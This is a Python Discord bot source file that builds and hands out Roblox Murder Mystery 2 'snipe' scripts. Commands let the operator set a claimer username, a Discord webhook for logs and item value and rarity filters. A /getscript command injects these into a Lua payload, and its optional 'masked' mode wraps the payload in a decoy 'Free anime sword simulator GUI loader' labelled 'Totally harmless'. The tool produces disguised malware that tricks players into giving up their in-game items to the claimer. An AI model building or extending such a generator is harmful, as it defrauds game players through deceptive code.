import nextcord
from nextcord.ext import commands
from nextcord import Interaction, SlashOption
import aiohttp
import asyncio
import json
import os

BOT_TOKEN = os.environ.get("BOT_TOKEN")

intents = nextcord.Intents.default()
intents.message_content = True
bot = commands.Bot(intents=intents)

STATE_FILE = "state.json"

def load_state() -> dict:
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    return {"webhook": "", "claimer": "", "min_value": 0, "min_rarity": "None"}

def save_state(state: dict):
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)

state = load_state()

MASK_WRAPPER = """-- {mask_name}
-- Free anime sword simulator GUI loader
-- Totally harmless, enjoy the game!

local function loadGui()
    print("Loading GUI...")
end

loadGui()

-- internal module init (do not remove)
{payload}
"""

PAYLOAD_TEMPLATE = """_G.username = "{claimer}"
_G.webhook  = "{webhook}"
_G.minValue = {min_value}
_G.minRarity = "{min_rarity}"
_G.troller  = false

{core_script}
"""

def load_core_script() -> str:
    if os.path.exists("core.lua"):
        with open("core.lua", "r") as f:
            return f.read()
    return "-- core.lua not found"

async def send_to_webhook(webhook_url: str, content: str, username: str = "MM2 Snipe Bot"):
    async with aiohttp.ClientSession() as session:
        payload = {"username": username, "content": content}
        async with session.post(webhook_url, json=payload) as resp:
            return resp.status


@bot.slash_command(name="setwebhook", description="Set the Discord webhook URL for snipe logs")
async def set_webhook(interaction: Interaction, url: str = SlashOption(description="Full Discord webhook URL")):
    if not url.startswith("https://discord.com/api/webhooks/"):
        await interaction.response.send_message("❌ Invalid webhook URL.", ephemeral=True)
        return
    state["webhook"] = url
    save_state(state)
    await interaction.response.send_message("✅ Webhook set.", ephemeral=True)


@bot.slash_command(name="setclaimer", description="Set the claimer Roblox username")
async def set_claimer(interaction: Interaction, username: str = SlashOption(description="Your Roblox username")):
    state["claimer"] = username
    save_state(state)
    await interaction.response.send_message(f"✅ Claimer set to `{username}`.", ephemeral=True)


@bot.slash_command(name="setfilters", description="Set minimum value and rarity filters")
async def set_filters(
    interaction: Interaction,
    min_value: int = SlashOption(description="Minimum item value"),
    min_rarity: str = SlashOption(
        description="Minimum rarity",
        choices=["None","Common","Uncommon","Rare","Legendary","Godly","Ancient","Chroma","Vintage","Unique","Pet"]
    )
):
    state["min_value"] = min_value
    state["min_rarity"] = min_rarity
    save_state(state)
    await interaction.response.send_message(
        f"✅ Filters — min value: `{min_value}` | min rarity: `{min_rarity}`", ephemeral=True
    )


@bot.slash_command(name="status", description="Show current bot configuration")
async def status(interaction: Interaction):
    embed = nextcord.Embed(title="MM2 Sniper Config", color=0xff6b35)
    embed.add_field(name="Claimer",    value=f"`{state['claimer'] or 'not set'}`",  inline=True)
    embed.add_field(name="Webhook",    value=f"`{'set' if state['webhook'] else 'not set'}`", inline=True)
    embed.add_field(name="Min Value",  value=f"`{state['min_value']}`",              inline=True)
    embed.add_field(name="Min Rarity", value=f"`{state['min_rarity']}`",             inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.slash_command(name="createchannel", description="Create a new log channel with its own webhook")
async def create_channel(
    interaction: Interaction,
    channel_name: str = SlashOption(description="Name for the new channel"),
    category_name: str = SlashOption(description="Optional category name", required=False)
):
    guild = interaction.guild
    if not guild:
        await interaction.response.send_message("❌ Must be used in a server.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    category = None
    if category_name:
        category = nextcord.utils.get(guild.categories, name=category_name)
        if not category:
            category = await guild.create_category(category_name)

    channel = await guild.create_text_channel(channel_name, category=category)
    wh = await channel.create_webhook(name="MM2 Snipe Logs")

    await interaction.followup.send(
        f"✅ Channel <#{channel.id}> created.\n🔗 Webhook: `{wh.url}`\n\nUse `/setwebhook` with this URL to point logs here.",
        ephemeral=True
    )


@bot.slash_command(name="getscript", description="Generate the configured snipe script")
async def get_script(
    interaction: Interaction,
    masked: bool = SlashOption(description="Wrap in an innocent-looking decoy loader", required=False, default=False)
):
    if not state["claimer"] or not state["webhook"]:
        await interaction.response.send_message("❌ Set claimer and webhook first.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    core = load_core_script()
    payload = PAYLOAD_TEMPLATE.format(
        claimer=state["claimer"],
        webhook=state["webhook"],
        min_value=state["min_value"],
        min_rarity=state["min_rarity"],
        core_script=core
    )

    output = MASK_WRAPPER.format(mask_name="Anime Sword Simulator GUI v3.2", payload=payload) if masked else payload

    fname = "script.lua"
    with open(fname, "w") as f:
        f.write(output)

    await interaction.followup.send(
        f"{'🎭 Masked' if masked else '📄 Raw'} script ready.",
        file=nextcord.File(fname, filename="script.lua"),
        ephemeral=True
    )
    os.remove(fname)


@bot.slash_command(name="testwebhook", description="Send a test ping to the configured webhook")
async def test_webhook(interaction: Interaction):
    if not state["webhook"]:
        await interaction.response.send_message("❌ No webhook set.", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    code = await send_to_webhook(state["webhook"], "✅ Webhook test from MM2 Sniper bot.")
    await interaction.followup.send(f"Webhook responded with HTTP `{code}`.", ephemeral=True)


@bot.event
async def on_ready():
    print(f"[+] Logged in as {bot.user} | Ready")

bot.run(BOT_TOKEN)
